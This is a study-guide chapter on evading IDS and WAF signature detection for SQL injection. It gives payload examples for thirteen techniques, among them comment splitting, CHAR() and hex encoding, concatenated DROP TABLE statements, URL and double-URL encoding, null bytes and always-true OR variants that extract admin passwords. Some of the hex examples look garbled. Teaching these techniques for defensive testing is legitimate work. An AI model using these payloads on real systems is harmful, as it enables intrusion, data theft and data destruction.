# 07 — IDS / WAF Evasion Techniques

Firewalls and Intrusion Detection Systems (IDS) can detect SQLi attempts based on predefined **signatures** — regular
expressions describing the string pattern of a known attack. Even when a network has these protections in place,
attackers use **evasion techniques** to obscure their input strings enough to slip past signature matching, without
changing what the underlying SQL actually does.

## Evading IDS — How Signature Detection Works

An IDS sensor placed near the database server inspects SQL statements. In a signature-based system, the IDS must
already "know" about an attack pattern to detect it: it builds a database of attack signatures, then compares
incoming input against that database at runtime. A match raises an alarm. This problem is most common in
**signature-based Network IDS (NIDS)** — which is exactly the class of system these evasion techniques are designed
to slip past.

```
Attacker → SQL Injection Attack → Internet → Firewall → IDS Filters → Security Admin (alerted)
                                                                              ↕
Network ← OS Shell ← Actual Data ← Database ← Web Application ────────────────
```

## Full List of Signature Evasion Techniques

| Technique | Idea |
|---|---|
| In-line Comment | Obscure input by inserting comments between SQL keywords |
| Char Encoding | Represent characters using the `CHAR()` function |
| String Concatenation | Build an SQL keyword via DB-specific concatenation syntax |
| Obfuscated Code | Make the SQL statement deliberately hard to read/match |
| Manipulating White Spaces | Drop/add whitespace between keywords |
| Hex Encoding | Represent a string using hexadecimal |
| Sophisticated Matches | Use an equivalent-but-different expression of `OR 1=1` |
| URL Encoding | Add `%` + hex code before each character |
| Null Byte | Prepend a `%00` character |
| Case Variation | Mix upper/lower case letters |
| Declare Variables | Pass crafted SQL through a variable instead of literally |
| IP Fragmentation | Split the attack across multiple IP packet fragments |
| Variation | Substitute an equivalent comparison expression |

### 1. In-line Comment

Works when a signature filters on whitespace. `/* ... */` delimits multi-row comments in SQL — letting you remove all
spaces between keywords while staying syntactically valid.

```sql
'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/username/**/LIKE/**/'admin'--
```

You can even split keywords themselves:

```sql
'/**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/**/OM/**/Users/**/WHE/**/RE/**/username/**/LIKE/**/'admin'--
```

### 2. Char Encoding

The `char()` function encodes injection variables to hex/decimal representations that pass SQL parsing while evading
signature detection — usable to inject into MySQL **without needing double quotes at all**.

```sql
-- Load a file via UNION (string = "/etc/passwd")
' union select 1,(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;

-- Inject without quotes (string = "%")
' or username like char(37);

-- Inject without quotes (string = "root")
' union select * from users where login = char(114,111,111,116);

-- Check for existing files (string = "n.ext")
' and 1=( if( (load_file(char(110,46,101,120,116)))<>char(39,39)),1,0));
```

### 3. String Concatenation

Break a single string into pieces and concatenate them at the SQL level — the engine builds the final string, but a
signature comparing literal strings on both sides of `=` never sees the whole thing at once. Concatenation syntax
varies by DB (`+` for SQL Server, `||` for Oracle).

```sql
-- Simple example
"OR 'Simple' = 'Sim'+'ple'."

-- Oracle
'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'

-- MSSQL
'; EXEC ('DRO' + 'P T' + 'AB' + 'LE')

-- MySQL — compose a statement instead of a parameterized query
'; EXECUTE CONCAT('INSE','RT US','ER')
```

### 4. Obfuscated Code

Two approaches:

1. **Wrapping** — use a wrap utility to obfuscate the malicious query before sending; the IDS signature won't match
   the obfuscated form and it passes through untouched.
2. **SQL string obfuscation** — obfuscate via concatenation, encryption, or hashing, then decode/decrypt at runtime.

**Examples producing the string `"qwerty"`:**

```sql
Reverse(concat(if(1,char(121),2),0x74,right(left(0x567210,2),1),lower(mid('TEST',2,1)),replace(0x7074,'pt','w'), char(instr(123321,33)+110)))

Concat(unhex(left(crc32(31337),3)-400),unhex(ceil(atan(1)*100-2)), unhex(round(log(2)*100)-4),char(114),char(right(cot(31337),2)+54), char(pow(11,2)))
```

**Bypassing a known signature by obfuscating the request:**

```sql
-- Original request matching a known signature
/?id=1+union+(select+1,2+from+test.users)

-- Bypassed via mixed case, extra parens, different column selection, hash/hex functions
/?id=(1)unIon(selEct(1),mid(hash,1,32)from(test.users))
/?id=1+union+(sELect'1',concat(login,hash)from+test.users)
/?id=(1)union((((((select(1),hex(hash)from(test.users))))))))
```

### 5. Manipulating White Spaces

Many signature-based engines detect specific whitespace patterns around malicious SQL, but miss the same text with
whitespace dropped or added (including tab, carriage return, line feed characters). This changes nothing about
execution.

```
"UNION SELECT" is a different signature from "UNION          SELECT"
```

Dropping spaces entirely often still executes fine on some databases:

```sql
'OR'1'='1'
```

### 6. Hex Encoding

Uses hexadecimal encoding to represent a string — most IDS don't recognize hex encodings at all, giving countless ways
to obfuscate a query.

```sql
-- 'SELECT' → 0x73656c656374

-- Using a hex value (MSSQL) — note: NO single quotes used at all
; declare @x varchar(80);
set @x = X73656c656374204040766573273696f6e;
EXEC (@x)
```

**More string-to-hex examples:**

```
SELECT @@version               = 0x73656c656374204040766573273696f6e
DROP Table CreditCard           = 0x44524f502054616 26c65204372656469 7443617264
INSERT into USERS ('certifiedhacker', 'qwerty') = 0x494e5345525420696e746f2055534552 5320282774657676794 26f79272c2027 71776572747927 29
```

### 7. Sophisticated Matches

Signature regexes catch common classical matches like `OR 1=1`. Attackers substitute equivalent-but-different
expressions to bypass them.

```sql
-- classic:                          OR 1=1
-- equivalent (bypasses simple regex): OR 'john' = 'john'
-- if THAT is caught too, add an N prefix (useful against advanced systems):
' OR 'john' = N'john'
```

**Full SQL Injection Characters reference:**

| Char | Meaning |
|---|---|
| `'` or `"` | Character string indicators |
| `--` or `#` | Single-line comment |
| `/*...*/` | Multiple-line comment |
| `+` | Addition, concatenate (or space in URL) |
| `\|\|` | (double pipe) concatenate |
| `%` | Wildcard attribute indicator |
| `?Param1=foo&Param2=bar` | URL parameters |
| `PRINT` | Useful as a non-transactional command |
| `@variable` | Local variable |
| `@@variable` | Global variable |
| `waitfor delay '0:0:10'` | Time delay |

**Examples for evading `' OR 1=1` specifically:**

```sql
OR 'john' = 'john'
' OR 'microsoft' = 'micro'+'soft'
' OR 'movies' = N'movies'
' OR 'software' like 'soft%'
' OR 7 > 1
' OR 'best' > 'b'
' OR 'whatever' IN ('whatever')
' OR 5 BETWEEN 1 AND 7
```

### 8. URL Encoding

Replace characters with their ASCII code in hex, preceded by `%`. E.g. single quote (`ASCII 0x27`) → `%27`.

```sql
-- Normal query
' UNION SELECT Password FROM Users_Data WHERE name='Admin'--

-- After URL encoding
%27%20UNION%20SELECT%20Password%20FROM%20Users_Data%20WHERE%20name%3D%27Admin%27%E2%80%94
```

**Double-URL encoding** — for when basic URL encoding gets normalized away by a filter before matching. `%27`
(URL-encoded quote) becomes `%2527` after a second pass (the `%` itself gets encoded to `%25`):

```
%2527%2520UNION%2520SELECT%2520Password%2520FROM%2520Users_Data%2520WHERE%2520name%253D%2527Admin%2527%25E2%2580%2594
```

### 9. Null Byte

Prepend a `%00` (null byte) character before a string. Web apps use high-level languages (PHP, ASP) alongside
C/C++ functions where NULL terminates strings — the mismatch between how each layer handles NULL causes a bypass.

```sql
-- Normal exfil query
' UNION SELECT Password FROM Users WHERE UserName='admin'--

-- If a WAF/IDS blocks it, prepend a null byte
%00' UNION SELECT Password FROM Users WHERE UserName='admin'--
```

### 10. Case Variation

SQL is case-insensitive by default in most database servers. A case-sensitive regex signature is trivially bypassed
by mixing letter case in the payload.

```sql
-- If the filter blocks this (and its ALL-CAPS form):
union select user_id, password from admin where user_name='admin'--

-- Bypass with mixed case:
UnIoN sEleCt UsEr_iD, PaSSwOrd fROm aDmiN wHeRe UseR_NamE='AdMIn'--
```

### 11. Declare Variables

Identify a variable to carry a series of specially crafted SQL statements, creating a sophisticated injection that
evades the signature mechanism entirely.

```sql
-- Original statement
UNION Select Password

-- Redefined via a variable
; declare @sqlvar nvarchar(70); set @sqlvar = (N'UNI' + N'ON' + N' SELECT' + N'Password'); EXEC(@sqlvar)
```

### 12. IP Fragmentation

Intentionally split an IP packet across multiple small fragments. The IDS/WAF must reassemble fragments before it can
match a signature; per-fragment inspection often fails to find a match at all. Ways to evade via fragmentation:

- Pause sending parts of the attack, hoping the IDS times out before the target computer does
- Send packets in reverse order
- Send packets in correct order except withhold/delay the **first** fragment
- Send packets in correct order except withhold/delay the **last** fragment
- Send packets out of order or randomly

### 13. Variation

The most general technique: substitute an equivalent comparison expression for a classical one — the SQL evaluates
identically, but the literal signature no longer matches. Infinitely many variations are possible. Goal: a `WHERE`
clause that always evaluates `TRUE`, using any mathematical or string comparison.

```sql
-- All of these return identical result sets:
SELECT * FROM accounts WHERE userName = 'Bob' OR 1=1 --
SELECT * FROM accounts WHERE userName = 'Bob' OR 2=2 --
SELECT * FROM accounts WHERE userName = 'Bob' OR 1+1=2 --
SELECT * FROM accounts WHERE userName = 'Bob' OR "evade"="ev"+"ade" --
```

---

**Previous:** [06 — SQL Injection Tools & AI-Assisted Testing](06-sql-injection-tools-and-ai.md) · **Next:** [08 — SQL Injection Countermeasures](08-sql-injection-countermeasures.md)
